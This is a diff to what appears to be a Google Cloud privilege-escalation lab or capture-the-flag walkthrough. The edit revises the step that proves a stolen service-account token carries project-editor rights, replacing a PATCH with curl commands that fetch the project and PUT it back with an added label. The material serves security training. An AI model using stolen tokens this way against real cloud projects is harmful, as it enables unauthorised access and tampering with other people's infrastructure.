@@ -123,17 +123,20 @@ curl "https://oauth2.googleapis.com/tokeninfo?access_token=$EXFILTRATED_TOKEN"
 # "email": "pl-prod-cr001-target@<project_id>.iam.gserviceaccount.com"
 ```
 
-Then prove the token carries the target's `roles/editor` privileges by writing a project label with it:
+Then prove the token carries the target's `roles/editor` privileges by writing a project label with it. The Resource Manager v1 `projects.update` method is a synchronous `PUT` of the full Project resource (`resourcemanager.projects.update`, which `roles/editor` includes) -- fetch the project, add a label, and PUT it back:
 
 ```bash
-curl -X PATCH \
+PROJECT_JSON=$(curl -s -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
+  "https://cloudresourcemanager.googleapis.com/v1/projects/<project_id>")
+UPDATED=$(echo "$PROJECT_JSON" | jq -c '.labels = ((.labels // {}) + {"pl-privesc-verified":"true"})')
+curl -X PUT \
   -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{"labels":{"pl-privesc-verified":"true"}}' \
-  "https://cloudresourcemanager.googleapis.com/v1/projects/<project_id>?updateMask=labels"
+  -d "$UPDATED" \
+  "https://cloudresourcemanager.googleapis.com/v1/projects/<project_id>"
 ```
 
-The write succeeds where your starting account would have been denied -- direct evidence that the stolen token authenticates as a project editor.
+(Note the shape: v1 `projects.update` is a full-resource `PUT`, not the `PATCH`+`updateMask` of the async v3 API -- a `PATCH` to the v1 endpoint silently no-ops.) The write succeeds where your starting account would have been denied -- direct evidence that the stolen token authenticates as a project editor. The demo restores the original labels immediately afterward.
 
 ## Capture the Flag
 
